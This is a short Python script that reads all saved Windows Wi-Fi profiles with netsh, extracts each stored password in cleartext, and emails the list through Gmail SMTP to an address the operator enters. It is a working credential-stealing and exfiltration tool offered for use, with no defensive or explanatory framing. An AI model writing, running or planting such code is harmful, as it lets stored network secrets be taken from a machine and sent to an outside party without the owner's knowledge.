import subprocess
import smtplib


def send_mail(email, password, message):

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


email = input("[+] Enter Email on which you want to recieve WIFI passwords: ")
print("[-] please enable -less secured apps-  to recieve an email")
password = input("[+] Enter Password : ")

listi = []
data = subprocess.check_output(['netsh', 'wlan', 'show',
                                'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profile', i,
         'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        listi.append(("{:<30}|  {:<}".format(i, results[0])))
    except IndexError:
        listi.append("{:<30}|  {:<}".format(i, ""))

res = ""
for msg in listi:
    res = res + msg + "\n"
# print(res)
try:
    send_mail(email, password, res)
    print("[+] email successfully sent\n")
except smtplib.SMTPAuthenticationError:
    print("[+] Incorrect Email or Password")
